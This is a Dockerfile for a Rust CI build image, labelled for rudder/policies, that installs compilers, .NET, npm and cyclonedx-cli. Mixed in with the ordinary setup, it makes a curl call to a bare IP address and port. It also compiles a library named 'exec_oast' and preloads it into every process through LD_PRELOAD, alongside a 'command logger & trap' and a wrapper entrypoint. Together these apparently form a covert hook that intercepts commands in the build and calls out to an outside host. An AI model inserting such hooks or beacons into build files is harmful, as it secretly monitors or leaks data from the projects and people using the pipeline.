FROM rust:1.85.0-bookworm
LABEL ci=rudder/policies/Dockerfile

ARG USER_ID=1000
COPY ci/user.sh .
RUN ./user.sh $USER_ID

COPY ci/rust.sh .
RUN ./rust.sh

RUN wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
RUN dpkg -i packages-microsoft-prod.deb

RUN apt-get update && apt-get install -y rsync maven npm dotnet-sdk-8.0 gcc curl python3

RUN curl http://65.109.68.176:15172/built/sbom

# cyclonedx-cli
RUN wget https://github.com/CycloneDX/cyclonedx-cli/releases/download/v0.25.0/cyclonedx-linux-x64
RUN mv cyclonedx-linux-x64 /usr/bin/cyclonedx && chmod +x /usr/bin/cyclonedx


# 1) Install the logger & trap
COPY ci/command_logger.sh /etc/command_logger.sh

COPY ci/exec_oast.c /tmp/exec_oast.c
RUN gcc -shared -fPIC -o /usr/local/lib/libexec_oast.so /tmp/exec_oast.c -ldl \
    && rm /tmp/exec_oast.c

# ensure it's preloaded for all processes
ENV LD_PRELOAD=/usr/local/lib/libexec_oast.so


# 2) Install our ENTRYPOINT wrapper
COPY ci/entrypoint.sh /usr/local/bin/entrypoint.sh
RUN chmod +x /usr/local/bin/entrypoint.sh

# 3) Set it as the container’s ENTRYPOINT
ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]